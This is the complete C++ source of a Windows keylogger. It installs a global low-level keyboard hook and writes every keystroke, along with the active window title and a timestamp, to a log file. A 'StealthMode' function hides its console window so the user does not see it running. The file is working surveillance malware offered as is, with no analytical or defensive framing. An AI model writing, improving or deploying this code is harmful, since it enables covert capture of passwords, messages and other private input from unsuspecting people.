#define UNICODE
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <ctime>
#include <map>
#include <thread>
#include <cstring>
#include <cctype>

using namespace std;

const map<int, string> keyname{
    {VK_BACK, "[BACKSPACE]"},
    {VK_SPACE, "_"},
    {VK_TAB, "[TAB]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_CONTROL, "[CONTROL]"},
    {VK_MENU, "[ALT]"},
    {VK_ESCAPE, "[ESCAPE]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"},
    {VK_DOWN, "[DOWN]"},
    {VK_PRIOR, "[PAGE_UP]"},
    {VK_NEXT, "[PAGE_DOWN]"},
    {VK_CAPITAL, "[CAPSLOCK]"}
};

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
ofstream output_file;

int SaveKeystroke(int key_stroke);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        SaveKeystroke(kbdStruct.vkCode);
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() {
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
    if (!_hook) {
        cerr << "[ERROR] Failed to install hook! Error Code: " << GetLastError() << endl;
        MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
        exit(1);
    } else {
        cout << "[INFO] Hook installed successfully." << endl;
    }
}

void ReleaseHook() {
    if (!UnhookWindowsHookEx(_hook)) {
        cerr << "[ERROR] Failed to release hook! Error Code: " << GetLastError() << endl;
    } else {
        cout << "[INFO] Hook released successfully." << endl;
    }
}

int SaveKeystroke(int key_stroke) {
    stringstream output;
    static char last_window[256] = "";

    HWND foreground = GetForegroundWindow();
    if (foreground) {
        char window_title[256];
        GetWindowTextA(foreground, window_title, sizeof(window_title));

        if (strcmp(window_title, last_window) != 0) {
            strcpy(last_window, window_title);

            time_t t = time(nullptr);
            char time_buffer[64];
            strftime(time_buffer, sizeof(time_buffer), "%Y-%m-%d %H:%M:%S", localtime(&t));

            output << "\n\n[Window: " << window_title << " - at " << time_buffer << "] ";
        }
    }

    if (keyname.find(key_stroke) != keyname.end()) {
        output << keyname.at(key_stroke);
    } else {

        char key = MapVirtualKeyA(key_stroke, MAPVK_VK_TO_CHAR);
        bool is_shift_pressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
        if (!is_shift_pressed) {
            key = tolower(key);
        }
        output << key;
    }

    if (output_file.is_open()) {
        output_file << output.str();
        output_file.flush();
    } else {
        cerr << "[ERROR] Log file is not open!" << endl;
    }

    return 0;
}

void StealthMode(bool hide) {
    HWND hwnd = FindWindowA("ConsoleWindowClass", NULL);
    if (hwnd) {
        ShowWindow(hwnd, hide ? SW_HIDE : SW_SHOW);
    } else {
        cerr << "[ERROR] Failed to find console window!" << endl;
    }
}

int main() {
    const char* log_file_name = "keylogger.log";
    output_file.open(log_file_name, ios_base::app);
    if (!output_file.is_open()) {
        cerr << "[ERROR] Failed to open log file!" << endl;
        return 1;
    } else {
        cout << "[INFO] Log file opened successfully." << endl;
    }

    StealthMode(true);

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        if (msg.message == WM_KEYDOWN && msg.wParam == VK_RETURN) {
            break;
        }
    }

    ReleaseHook();
    output_file.close();

    cout << "[INFO] Keylogger terminated successfully." << endl;
    return 0;
}
